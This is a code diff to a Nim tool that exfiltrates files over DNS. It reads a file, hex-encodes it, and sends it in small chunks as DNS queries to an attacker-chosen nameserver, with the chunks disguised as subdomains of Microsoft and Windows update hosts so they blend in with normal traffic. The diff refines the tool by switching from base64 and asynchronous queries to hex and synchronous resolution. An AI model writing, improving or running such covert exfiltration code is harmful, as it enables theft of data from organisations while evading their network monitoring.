@@ -1,44 +1,47 @@
-import std/[os, strutils, random, asyncdispatch]
+import std/[os, strutils, random]
 import pkg/ndns
-from base64 import encode
 randomize()
-
-proc nDns(ns: string, dnsquery: string) {.async.} =
-    let
-        header = initHeader(randId(), rd = true)
-        client = initDnsClient(ns)
-        question = initQuestion(dnsquery, QType.A, QClass.IN)
-        msg = initMessage(header, @[question])
-        resp = waitFor dnsAsyncQuery(client, msg)
 
 proc dnsExfil(ns: string, target: string, slp: int): void =
     let
+        client = initDnsClient(ns)
         content = readFile(target)
-        b64 = encode(content, safe=true).replace("=", "")
+        hex = content.toHex
         chuckSize = 20 # max 62
         domains = [".client.a.msn.windows.com", ".a.wns.update.windows.com", ".a.wns.o365.microsoft.com", ".msft.a.msn.microsoft.com"]
-    
+
     var stringindex: int
 
     echo "[+] Sending ", target
 
+    while stringindex <= hex.len-1:
+        let
+            query =  hex[stringindex .. (if stringindex + chuckSize - 1 > hex.len - 1: hex.len - 1 else: stringindex + chuckSize - 1)]
+            dnsquery = query & sample(domains)
+
+        try:
+            discard resolveIpv4(client, dnsquery, 1)
+        except CatchableError as e:
+            if e.msg.contains("timeout"):
+                #echo "ok ", dnsquery
+                discard
+            else:
+                #echo "err ", dnsquery
+                quit(e.msg)
+
+        inc(stringindex, chuckSize)
+        sleep(slp)
+
     try:
-        while stringindex <= b64.len-1:
-            let
-                query =  b64[stringindex .. (if stringindex + chuckSize - 1 > b64.len - 1: b64.len - 1 else: stringindex + chuckSize - 1)]
-                dnsquery = query & sample(domains)
-            
-            #echo dnsquery
-            
-            asyncCheck nDns(ns, dnsquery)
-            inc(stringindex, chuckSize)
-            sleep(slp)
-        
-        asyncCheck nDns(ns, "quit")
-        echo "[+] Done!"
-        
+        discard resolveIpv4(client, "quit", 1)
     except CatchableError as e:
-        echo "[!] Error: ", e.msg
+        if e.msg.contains("timeout"):
+            discard
+        else:
+            quit(e.msg)
+
+    echo "[+] Done!"
+
 
 when isMainModule:
     if paramCount() < 3:
